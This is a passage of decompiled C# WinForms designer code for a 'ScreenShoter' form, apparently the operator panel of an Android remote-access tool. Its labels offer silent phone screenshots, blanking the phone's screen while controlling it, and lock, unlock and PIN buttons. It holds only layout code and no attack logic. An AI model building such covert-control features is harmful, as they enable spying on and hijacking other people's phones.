		this.toptitle.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.PBS.Dock = System.Windows.Forms.DockStyle.Top;
		this.PBS.FillColor = System.Drawing.Color.Black;
		this.PBS.Font = new System.Drawing.Font("Calibri", 12f);
		this.PBS.ForeColor = System.Drawing.Color.SkyBlue;
		this.PBS.Location = new System.Drawing.Point(0, 0);
		this.PBS.Margin = new System.Windows.Forms.Padding(4);
		this.PBS.MinimumSize = new System.Drawing.Size(70, 23);
		this.PBS.Name = "PBS";
		this.PBS.RectColor = System.Drawing.Color.SkyBlue;
		this.PBS.ShowValue = false;
		this.PBS.Size = new System.Drawing.Size(392, 23);
		this.PBS.Style = DrakeUI.Framework.UIStyle.Custom;
		this.PBS.TabIndex = 2;
		this.PBS.Text = "0.0%";
		this.Panel1.BackColor = System.Drawing.Color.Black;
		this.Panel1.Controls.Add(this.vewpnl);
		this.Panel1.Controls.Add(this.PBS);
		this.Panel1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel1.Location = new System.Drawing.Point(16, 55);
		this.Panel1.Margin = new System.Windows.Forms.Padding(4);
		this.Panel1.Name = "Panel1";
		this.Panel1.Size = new System.Drawing.Size(392, 754);
		this.Panel1.TabIndex = 2;
		this.Panel2.BackColor = System.Drawing.Color.Transparent;
		this.Panel2.Controls.Add(this.pinbtn);
		this.Panel2.Controls.Add(this.DrakeUIAvatar9);
		this.Panel2.Controls.Add(this.DrakeUIAvatar1);
		this.Panel2.Controls.Add(this.PictureBox3);
		this.Panel2.Controls.Add(this.PictureBox2);
		this.Panel2.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel2.Location = new System.Drawing.Point(0, 0);
		this.Panel2.Margin = new System.Windows.Forms.Padding(4);
		this.Panel2.Name = "Panel2";
		this.Panel2.Size = new System.Drawing.Size(424, 55);
		this.Panel2.TabIndex = 2;
		this.DrakeUIAvatar9.AvatarSize = 30;
		this.DrakeUIAvatar9.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIAvatar9.FillColor = System.Drawing.Color.Transparent;
		this.DrakeUIAvatar9.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIAvatar9.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIAvatar9.Location = new System.Drawing.Point(282, 13);
		this.DrakeUIAvatar9.Name = "DrakeUIAvatar9";
		this.DrakeUIAvatar9.Size = new System.Drawing.Size(49, 39);
		this.DrakeUIAvatar9.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIAvatar9.Symbol = 61758;
		this.DrakeUIAvatar9.SymbolSize = 30;
		this.DrakeUIAvatar9.TabIndex = 3;
		this.DrakeUIAvatar9.Text = "DrakeUIAvatar9";
		this.DrakeUIToolTip1.SetToolTip(this.DrakeUIAvatar9, "UnLock Screen");
		this.DrakeUIAvatar1.AvatarSize = 30;
		this.DrakeUIAvatar1.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIAvatar1.FillColor = System.Drawing.Color.Transparent;
		this.DrakeUIAvatar1.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIAvatar1.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIAvatar1.Location = new System.Drawing.Point(337, 13);
		this.DrakeUIAvatar1.Name = "DrakeUIAvatar1";
		this.DrakeUIAvatar1.Size = new System.Drawing.Size(49, 39);
		this.DrakeUIAvatar1.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIAvatar1.Symbol = 61475;
		this.DrakeUIAvatar1.SymbolSize = 30;
		this.DrakeUIAvatar1.TabIndex = 2;
		this.DrakeUIAvatar1.Text = "DrakeUIAvatar1";
		this.DrakeUIToolTip1.SetToolTip(this.DrakeUIAvatar1, "Lock Screen");
		this.PictureBox3.Location = new System.Drawing.Point(83, 23);
		this.PictureBox3.Margin = new System.Windows.Forms.Padding(4);
		this.PictureBox3.Name = "PictureBox3";
		this.PictureBox3.Size = new System.Drawing.Size(36, 28);
		this.PictureBox3.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.PictureBox3.TabIndex = 1;
		this.PictureBox3.TabStop = false;
		this.PictureBox2.Location = new System.Drawing.Point(35, 13);
		this.PictureBox2.Margin = new System.Windows.Forms.Padding(4);
		this.PictureBox2.Name = "PictureBox2";
		this.PictureBox2.Size = new System.Drawing.Size(40, 39);
		this.PictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
		this.PictureBox2.TabIndex = 0;
		this.PictureBox2.TabStop = false;
		this.Panel3.BackColor = System.Drawing.Color.Transparent;
		this.Panel3.Dock = System.Windows.Forms.DockStyle.Right;
		this.Panel3.Location = new System.Drawing.Point(408, 55);
		this.Panel3.Margin = new System.Windows.Forms.Padding(4);
		this.Panel3.Name = "Panel3";
		this.Panel3.Size = new System.Drawing.Size(16, 754);
		this.Panel3.TabIndex = 3;
		this.Panel4.BackColor = System.Drawing.Color.Transparent;
		this.Panel4.Dock = System.Windows.Forms.DockStyle.Left;
		this.Panel4.Location = new System.Drawing.Point(0, 55);
		this.Panel4.Margin = new System.Windows.Forms.Padding(4);
		this.Panel4.Name = "Panel4";
		this.Panel4.Size = new System.Drawing.Size(16, 754);
		this.Panel4.TabIndex = 4;
		this.Panel5.BackColor = System.Drawing.Color.Transparent;
		this.Panel5.Controls.Add(this.DrakeUIAvatar2);
		this.Panel5.Controls.Add(this.textsend);
		this.Panel5.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.Panel5.Location = new System.Drawing.Point(0, 809);
		this.Panel5.Margin = new System.Windows.Forms.Padding(4);
		this.Panel5.Name = "Panel5";
		this.Panel5.Size = new System.Drawing.Size(424, 59);
		this.Panel5.TabIndex = 4;
		this.DrakeUIAvatar2.AvatarSize = 45;
		this.DrakeUIAvatar2.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIAvatar2.FillColor = System.Drawing.Color.Transparent;
		this.DrakeUIAvatar2.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIAvatar2.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIAvatar2.Location = new System.Drawing.Point(352, 7);
		this.DrakeUIAvatar2.Name = "DrakeUIAvatar2";
		this.DrakeUIAvatar2.Size = new System.Drawing.Size(46, 30);
		this.DrakeUIAvatar2.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIAvatar2.Symbol = 61912;
		this.DrakeUIAvatar2.SymbolSize = 25;
		this.DrakeUIAvatar2.TabIndex = 45;
		this.DrakeUIAvatar2.Text = "DrakeUIAvatar2";
		this.DrakeUIToolTip1.SetToolTip(this.DrakeUIAvatar2, "Send");
		this.textsend.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.textsend.FillColor = System.Drawing.Color.Black;
		this.textsend.Font = new System.Drawing.Font("Calibri", 12f);
		this.textsend.ForeColor = System.Drawing.Color.SkyBlue;
		this.textsend.Location = new System.Drawing.Point(35, 6);
		this.textsend.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
		this.textsend.Maximum = 2147483647.0;
		this.textsend.Minimum = -2147483648.0;
		this.textsend.Name = "textsend";
		this.textsend.Padding = new System.Windows.Forms.Padding(7, 6, 7, 6);
		this.textsend.Radius = 10;
		this.textsend.RectColor = System.Drawing.Color.SkyBlue;
		this.textsend.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.textsend.Size = new System.Drawing.Size(309, 32);
		this.textsend.Style = DrakeUI.Framework.UIStyle.Custom;
		this.textsend.StyleCustomMode = true;
		this.textsend.TabIndex = 44;
		this.textsend.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
		this.textsend.Watermark = "Enter Text";
		this.Panel6.BackColor = System.Drawing.Color.Transparent;
		this.Panel6.BackgroundImage = (System.Drawing.Image)resources.GetObject("Panel6.BackgroundImage");
		this.Panel6.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
		this.Panel6.Controls.Add(this.Panel1);
		this.Panel6.Controls.Add(this.Panel4);
		this.Panel6.Controls.Add(this.Panel3);
		this.Panel6.Controls.Add(this.Panel5);
		this.Panel6.Controls.Add(this.Panel2);
		this.Panel6.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel6.Location = new System.Drawing.Point(0, 0);
		this.Panel6.Margin = new System.Windows.Forms.Padding(4);
		this.Panel6.Name = "Panel6";
		this.Panel6.Size = new System.Drawing.Size(424, 868);
		this.Panel6.TabIndex = 2;
		this.Panel7.BackColor = System.Drawing.Color.Black;
		this.Panel7.Controls.Add(this.DrakeUIAvatar7);
		this.Panel7.Controls.Add(this.combosize);
		this.Panel7.Controls.Add(this.Label7);
		this.Panel7.Controls.Add(this.Label6);
		this.Panel7.Controls.Add(this.Qualtibox);
		this.Panel7.Controls.Add(this.Label1);
		this.Panel7.Controls.Add(this.Label5);
		this.Panel7.Controls.Add(this.FPSBOX);
		this.Panel7.Controls.Add(this.Label2);
		this.Panel7.Controls.Add(this.Label4);
		this.Panel7.Controls.Add(this.Dismisbtn);
		this.Panel7.Controls.Add(this.SKtype);
		this.Panel7.Controls.Add(this.scshotbtn);
		this.Panel7.Controls.Add(this.chkctrl);
		this.Panel7.Controls.Add(this.checkblock);
		this.Panel7.Controls.Add(this.Save);
		this.Panel7.Controls.Add(this.StopButton);
		this.Panel7.Controls.Add(this.StartButton);
		this.Panel7.Controls.Add(this.Panel9);
		this.Panel7.Controls.Add(this.DrakeUIAvatar4);
		this.Panel7.Controls.Add(this.DrakeUIAvatar3);
		this.Panel7.Dock = System.Windows.Forms.DockStyle.Right;
		this.Panel7.Location = new System.Drawing.Point(424, 0);
		this.Panel7.Margin = new System.Windows.Forms.Padding(4);
		this.Panel7.Name = "Panel7";
		this.Panel7.Size = new System.Drawing.Size(100, 868);
		this.Panel7.TabIndex = 2;
		this.DrakeUIAvatar7.AvatarSize = 45;
		this.DrakeUIAvatar7.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIAvatar7.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.DrakeUIAvatar7.FillColor = System.Drawing.Color.Transparent;
		this.DrakeUIAvatar7.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIAvatar7.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIAvatar7.Location = new System.Drawing.Point(0, 724);
		this.DrakeUIAvatar7.Name = "DrakeUIAvatar7";
		this.DrakeUIAvatar7.Size = new System.Drawing.Size(100, 48);
		this.DrakeUIAvatar7.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIAvatar7.Symbol = 61641;
		this.DrakeUIAvatar7.SymbolSize = 25;
		this.DrakeUIAvatar7.TabIndex = 37;
		this.DrakeUIAvatar7.Text = "DrakeUIAvatar7";
		this.DrakeUIToolTip1.SetToolTip(this.DrakeUIAvatar7, "Recent");
		this.combosize.Dock = System.Windows.Forms.DockStyle.Top;
		this.combosize.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.combosize.FillColor = System.Drawing.Color.Black;
		this.combosize.Font = new System.Drawing.Font("Calibri", 9f);
		this.combosize.ForeColor = System.Drawing.Color.SkyBlue;
		this.combosize.Location = new System.Drawing.Point(0, 596);
		this.combosize.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
		this.combosize.MinimumSize = new System.Drawing.Size(84, 0);
		this.combosize.Name = "combosize";
		this.combosize.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
		this.combosize.RectColor = System.Drawing.Color.SkyBlue;
		this.combosize.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.combosize.Size = new System.Drawing.Size(100, 26);
		this.combosize.Style = DrakeUI.Framework.UIStyle.Custom;
		this.combosize.StyleCustomMode = true;
		this.combosize.TabIndex = 26;
		this.combosize.Text = "Auto";
		this.combosize.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.combosize.Visible = false;
		this.Label7.Dock = System.Windows.Forms.DockStyle.Top;
		this.Label7.Font = new System.Drawing.Font("Calibri", 10f);
		this.Label7.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label7.Location = new System.Drawing.Point(0, 575);
		this.Label7.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label7.Name = "Label7";
		this.Label7.Size = new System.Drawing.Size(100, 21);
		this.Label7.TabIndex = 25;
		this.Label7.Text = "Size(px)";
		this.Label7.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.Label7.Visible = false;
		this.Label6.Dock = System.Windows.Forms.DockStyle.Top;
		this.Label6.Font = new System.Drawing.Font("Calibri", 10f);
		this.Label6.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label6.Location = new System.Drawing.Point(0, 561);
		this.Label6.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label6.Name = "Label6";
		this.Label6.Size = new System.Drawing.Size(100, 14);
		this.Label6.TabIndex = 23;
		this.Label6.Text = "\r\n\r\n\r\n";
		this.Label6.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.Qualtibox.Dock = System.Windows.Forms.DockStyle.Top;
		this.Qualtibox.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.Qualtibox.FillColor = System.Drawing.Color.Black;
		this.Qualtibox.Font = new System.Drawing.Font("Calibri", 9f);
		this.Qualtibox.ForeColor = System.Drawing.Color.SkyBlue;
		this.Qualtibox.Items.AddRange(new object[10] { "10", "20", "30", "40", "50", "60", "70", "80", "90", "100" });
		this.Qualtibox.Location = new System.Drawing.Point(0, 535);
		this.Qualtibox.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
		this.Qualtibox.MinimumSize = new System.Drawing.Size(84, 0);
		this.Qualtibox.Name = "Qualtibox";
		this.Qualtibox.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
		this.Qualtibox.RectColor = System.Drawing.Color.SkyBlue;
		this.Qualtibox.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.Qualtibox.Size = new System.Drawing.Size(100, 26);
		this.Qualtibox.Style = DrakeUI.Framework.UIStyle.Custom;
		this.Qualtibox.StyleCustomMode = true;
		this.Qualtibox.TabIndex = 28;
		this.Qualtibox.Text = "100";
		this.Qualtibox.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.Label5.Dock = System.Windows.Forms.DockStyle.Top;
		this.Label5.Font = new System.Drawing.Font("Calibri", 10f);
		this.Label5.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label5.Location = new System.Drawing.Point(0, 496);
		this.Label5.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label5.Name = "Label5";
		this.Label5.Size = new System.Drawing.Size(100, 18);
		this.Label5.TabIndex = 22;
		this.Label5.Text = "\r\n\r\n\r\n";
		this.Label5.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.FPSBOX.Dock = System.Windows.Forms.DockStyle.Top;
		this.FPSBOX.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.FPSBOX.FillColor = System.Drawing.Color.Black;
		this.FPSBOX.Font = new System.Drawing.Font("Calibri", 9f);
		this.FPSBOX.ForeColor = System.Drawing.Color.SkyBlue;
		this.FPSBOX.Location = new System.Drawing.Point(0, 470);
		this.FPSBOX.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
		this.FPSBOX.MinimumSize = new System.Drawing.Size(84, 0);
		this.FPSBOX.Name = "FPSBOX";
		this.FPSBOX.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
		this.FPSBOX.RectColor = System.Drawing.Color.SkyBlue;
		this.FPSBOX.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.FPSBOX.Size = new System.Drawing.Size(100, 26);
		this.FPSBOX.Style = DrakeUI.Framework.UIStyle.Custom;
		this.FPSBOX.StyleCustomMode = true;
		this.FPSBOX.TabIndex = 27;
		this.FPSBOX.Text = "2";
		this.FPSBOX.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.Label4.Dock = System.Windows.Forms.DockStyle.Top;
		this.Label4.Font = new System.Drawing.Font("Roboto Black", 10f, System.Drawing.FontStyle.Bold);
		this.Label4.ForeColor = System.Drawing.Color.SkyBlue;
		this.Label4.Location = new System.Drawing.Point(0, 439);
		this.Label4.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
		this.Label4.Name = "Label4";
		this.Label4.Size = new System.Drawing.Size(100, 10);
		this.Label4.TabIndex = 21;
		this.Label4.Text = "\r\n\r\n\r\n";
		this.Label4.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
		this.Dismisbtn.AvatarSize = 45;
		this.Dismisbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.Dismisbtn.Dock = System.Windows.Forms.DockStyle.Top;
		this.Dismisbtn.FillColor = System.Drawing.Color.Transparent;
		this.Dismisbtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.Dismisbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.Dismisbtn.Location = new System.Drawing.Point(0, 391);
		this.Dismisbtn.Name = "Dismisbtn";
		this.Dismisbtn.Size = new System.Drawing.Size(100, 48);
		this.Dismisbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.Dismisbtn.Symbol = 61473;
		this.Dismisbtn.SymbolSize = 25;
		this.Dismisbtn.TabIndex = 29;
		this.Dismisbtn.Text = "DrakeUIAvatar3";
		this.DrakeUIToolTip1.SetToolTip(this.Dismisbtn, "Dismiss Screenshot");
		this.Dismisbtn.Visible = false;
		this.SKtype.Dock = System.Windows.Forms.DockStyle.Top;
		this.SKtype.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
		this.SKtype.FillColor = System.Drawing.Color.Black;
		this.SKtype.Font = new System.Drawing.Font("Calibri", 9f);
		this.SKtype.ForeColor = System.Drawing.Color.FromArgb(65, 177, 225);
		this.SKtype.Items.AddRange(new object[2] { "Slient", "Normal" });
		this.SKtype.Location = new System.Drawing.Point(0, 365);
		this.SKtype.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
		this.SKtype.MinimumSize = new System.Drawing.Size(84, 0);
		this.SKtype.Name = "SKtype";
		this.SKtype.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
		this.SKtype.RectColor = System.Drawing.Color.SkyBlue;
		this.SKtype.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.SKtype.Size = new System.Drawing.Size(100, 26);
		this.SKtype.Style = DrakeUI.Framework.UIStyle.Custom;
		this.SKtype.StyleCustomMode = true;
		this.SKtype.TabIndex = 28;
		this.SKtype.Text = "Slient";
		this.SKtype.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
		this.scshotbtn.AvatarSize = 45;
		this.scshotbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.scshotbtn.Dock = System.Windows.Forms.DockStyle.Top;
		this.scshotbtn.FillColor = System.Drawing.Color.Transparent;
		this.scshotbtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.scshotbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.scshotbtn.Location = new System.Drawing.Point(0, 317);
		this.scshotbtn.Name = "scshotbtn";
		this.scshotbtn.Size = new System.Drawing.Size(100, 48);
		this.scshotbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.scshotbtn.Symbol = 62024;
		this.scshotbtn.TabIndex = 3;
		this.scshotbtn.Text = "DrakeUIAvatar2";
		this.DrakeUIToolTip1.SetToolTip(this.scshotbtn, "Phone Screen Shot");
		this.chkctrl.CheckBoxColor = System.Drawing.Color.SkyBlue;
		this.chkctrl.Cursor = System.Windows.Forms.Cursors.Hand;
		this.chkctrl.Dock = System.Windows.Forms.DockStyle.Top;
		this.chkctrl.Enabled = false;
		this.chkctrl.Font = new System.Drawing.Font("Calibri", 10f);
		this.chkctrl.ForeColor = System.Drawing.Color.SkyBlue;
		this.chkctrl.Location = new System.Drawing.Point(0, 255);
		this.chkctrl.Margin = new System.Windows.Forms.Padding(4);
		this.chkctrl.Name = "chkctrl";
		this.chkctrl.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.chkctrl.Size = new System.Drawing.Size(100, 62);
		this.chkctrl.Style = DrakeUI.Framework.UIStyle.Custom;
		this.chkctrl.StyleCustomMode = true;
		this.chkctrl.TabIndex = 31;
		this.chkctrl.Text = "Control";
		this.chkctrl.TextAlign = System.Drawing.ContentAlignment.TopLeft;
		this.DrakeUIToolTip1.SetToolTip(this.chkctrl, "Allow Screen Control While blocked");
		this.checkblock.CheckBoxColor = System.Drawing.Color.SkyBlue;
		this.checkblock.Cursor = System.Windows.Forms.Cursors.Hand;
		this.checkblock.Dock = System.Windows.Forms.DockStyle.Top;
		this.checkblock.Font = new System.Drawing.Font("Calibri", 10f);
		this.checkblock.ForeColor = System.Drawing.Color.SkyBlue;
		this.checkblock.Location = new System.Drawing.Point(0, 193);
		this.checkblock.Margin = new System.Windows.Forms.Padding(4);
		this.checkblock.Name = "checkblock";
		this.checkblock.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
		this.checkblock.Size = new System.Drawing.Size(100, 62);
		this.checkblock.Style = DrakeUI.Framework.UIStyle.Custom;
		this.checkblock.StyleCustomMode = true;
		this.checkblock.TabIndex = 30;
		this.checkblock.Text = "Block";
		this.checkblock.TextAlign = System.Drawing.ContentAlignment.TopLeft;
		this.DrakeUIToolTip1.SetToolTip(this.checkblock, "Disable the phone screen while controlling");
		this.StopButton.AvatarSize = 45;
		this.StopButton.Cursor = System.Windows.Forms.Cursors.Hand;
		this.StopButton.Dock = System.Windows.Forms.DockStyle.Top;
		this.StopButton.FillColor = System.Drawing.Color.Transparent;
		this.StopButton.Font = new System.Drawing.Font("Calibri", 12f);
		this.StopButton.ForeColor = System.Drawing.Color.SkyBlue;
		this.StopButton.Icon = DrakeUI.Framework.DrakeUIAvatar.UIIcon.Text;
		this.StopButton.Location = new System.Drawing.Point(0, 76);
		this.StopButton.Name = "StopButton";
		this.StopButton.Size = new System.Drawing.Size(100, 48);
		this.StopButton.Style = DrakeUI.Framework.UIStyle.Custom;
		this.StopButton.Symbol = 61526;
		this.StopButton.SymbolSize = 25;
		this.StopButton.TabIndex = 33;
		this.StopButton.Text = "Stop";
		this.DrakeUIToolTip1.SetToolTip(this.StopButton, "Stop");
		this.StartButton.AvatarSize = 45;
		this.StartButton.Cursor = System.Windows.Forms.Cursors.Hand;
		this.StartButton.Dock = System.Windows.Forms.DockStyle.Top;
		this.StartButton.FillColor = System.Drawing.Color.Transparent;
		this.StartButton.Font = new System.Drawing.Font("Calibri", 12f);
		this.StartButton.ForeColor = System.Drawing.Color.SkyBlue;
		this.StartButton.Icon = DrakeUI.Framework.DrakeUIAvatar.UIIcon.Text;
		this.StartButton.Location = new System.Drawing.Point(0, 28);
		this.StartButton.Name = "StartButton";
		this.StartButton.Size = new System.Drawing.Size(100, 48);
		this.StartButton.Style = DrakeUI.Framework.UIStyle.Custom;
		this.StartButton.Symbol = 61457;
		this.StartButton.SymbolSize = 25;
		this.StartButton.TabIndex = 32;
		this.StartButton.Text = "Start";
		this.DrakeUIToolTip1.SetToolTip(this.StartButton, "Start");
		this.Panel9.BackColor = System.Drawing.Color.Black;
		this.Panel9.Controls.Add(this.DrakeUIAvatar5);
		this.Panel9.Controls.Add(this.DrakeUIAvatar6);
		this.Panel9.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel9.Location = new System.Drawing.Point(0, 0);
		this.Panel9.Name = "Panel9";
		this.Panel9.Size = new System.Drawing.Size(100, 28);
		this.Panel9.TabIndex = 34;
		this.DrakeUIAvatar5.AvatarSize = 15;
		this.DrakeUIAvatar5.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIAvatar5.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeUIAvatar5.FillColor = System.Drawing.Color.Transparent;
		this.DrakeUIAvatar5.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIAvatar5.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIAvatar5.Location = new System.Drawing.Point(34, 0);
		this.DrakeUIAvatar5.Name = "DrakeUIAvatar5";
		this.DrakeUIAvatar5.Size = new System.Drawing.Size(33, 28);
		this.DrakeUIAvatar5.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIAvatar5.Symbol = 61544;
		this.DrakeUIAvatar5.SymbolSize = 20;
		this.DrakeUIAvatar5.TabIndex = 30;
		this.DrakeUIAvatar5.Text = "DrakeUIAvatar3";
		this.DrakeUIToolTip1.SetToolTip(this.DrakeUIAvatar5, "Minimize");
		this.DrakeUIAvatar6.AvatarSize = 15;
		this.DrakeUIAvatar6.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIAvatar6.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeUIAvatar6.FillColor = System.Drawing.Color.Transparent;
		this.DrakeUIAvatar6.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIAvatar6.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIAvatar6.Location = new System.Drawing.Point(67, 0);
		this.DrakeUIAvatar6.Name = "DrakeUIAvatar6";
		this.DrakeUIAvatar6.Size = new System.Drawing.Size(33, 28);
		this.DrakeUIAvatar6.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIAvatar6.Symbol = 61453;
		this.DrakeUIAvatar6.SymbolSize = 20;
		this.DrakeUIAvatar6.TabIndex = 31;
		this.DrakeUIAvatar6.Text = "DrakeUIAvatar3";
		this.DrakeUIToolTip1.SetToolTip(this.DrakeUIAvatar6, "Exit");
		this.DrakeUIAvatar4.AvatarSize = 45;
		this.DrakeUIAvatar4.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIAvatar4.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.DrakeUIAvatar4.FillColor = System.Drawing.Color.Transparent;
		this.DrakeUIAvatar4.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIAvatar4.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIAvatar4.Location = new System.Drawing.Point(0, 772);
		this.DrakeUIAvatar4.Name = "DrakeUIAvatar4";
		this.DrakeUIAvatar4.Size = new System.Drawing.Size(100, 48);
		this.DrakeUIAvatar4.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIAvatar4.Symbol = 61713;
		this.DrakeUIAvatar4.SymbolSize = 25;
		this.DrakeUIAvatar4.TabIndex = 36;
		this.DrakeUIAvatar4.Text = "DrakeUIAvatar4";
		this.DrakeUIToolTip1.SetToolTip(this.DrakeUIAvatar4, "Home");
		this.DrakeUIAvatar3.AvatarSize = 45;
		this.DrakeUIAvatar3.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIAvatar3.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.DrakeUIAvatar3.FillColor = System.Drawing.Color.Transparent;
		this.DrakeUIAvatar3.Font = new System.Drawing.Font("Calibri", 12f);
		this.DrakeUIAvatar3.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIAvatar3.Location = new System.Drawing.Point(0, 820);
		this.DrakeUIAvatar3.Name = "DrakeUIAvatar3";
		this.DrakeUIAvatar3.Size = new System.Drawing.Size(100, 48);
		this.DrakeUIAvatar3.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIAvatar3.Symbol = 61540;
		this.DrakeUIAvatar3.SymbolSize = 25;
		this.DrakeUIAvatar3.TabIndex = 35;
		this.DrakeUIAvatar3.Text = "DrakeUIAvatar3";
		this.DrakeUIToolTip1.SetToolTip(this.DrakeUIAvatar3, "Back");
		this.DrakeUIToolTip1.BackColor = System.Drawing.Color.FromArgb(54, 54, 54);
		this.DrakeUIToolTip1.ForeColor = System.Drawing.Color.SkyBlue;
		this.DrakeUIToolTip1.OwnerDraw = true;
		this.Timer1.Interval = 1;
		this.refreshtimer.Interval = 1;
		this.presstimer.Interval = 1000;
		this.pinbtn.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
		this.pinbtn.BackColor = System.Drawing.Color.Black;
		this.pinbtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.pinbtn.FillColor = System.Drawing.Color.Black;
		this.pinbtn.Font = new System.Drawing.Font("Calibri", 12f);
		this.pinbtn.ForeColor = System.Drawing.Color.SkyBlue;
		this.pinbtn.Location = new System.Drawing.Point(126, 12);
		this.pinbtn.Name = "pinbtn";
		this.pinbtn.RectColor = System.Drawing.Color.Transparent;
		this.pinbtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.pinbtn.Size = new System.Drawing.Size(49, 39);
		this.pinbtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.pinbtn.Symbol = 61581;
		this.pinbtn.SymbolSize = 30;
		this.pinbtn.TabIndex = 30;
		this.pinbtn.TagString = "";
		this.DrakeUIToolTip1.SetToolTip(this.pinbtn, "PIN");
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 16f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.SkyBlue;
		this.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
		base.ClientSize = new System.Drawing.Size(524, 868);
		base.Controls.Add(this.Panel6);
		base.Controls.Add(this.Panel7);
		this.DoubleBuffered = true;
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
		base.Margin = new System.Windows.Forms.Padding(4);
		this.MinimumSize = new System.Drawing.Size(443, 603);
		base.Name = "ScreenShoter";
		base.ShowIcon = false;
		this.Text = "ScreenShoter";
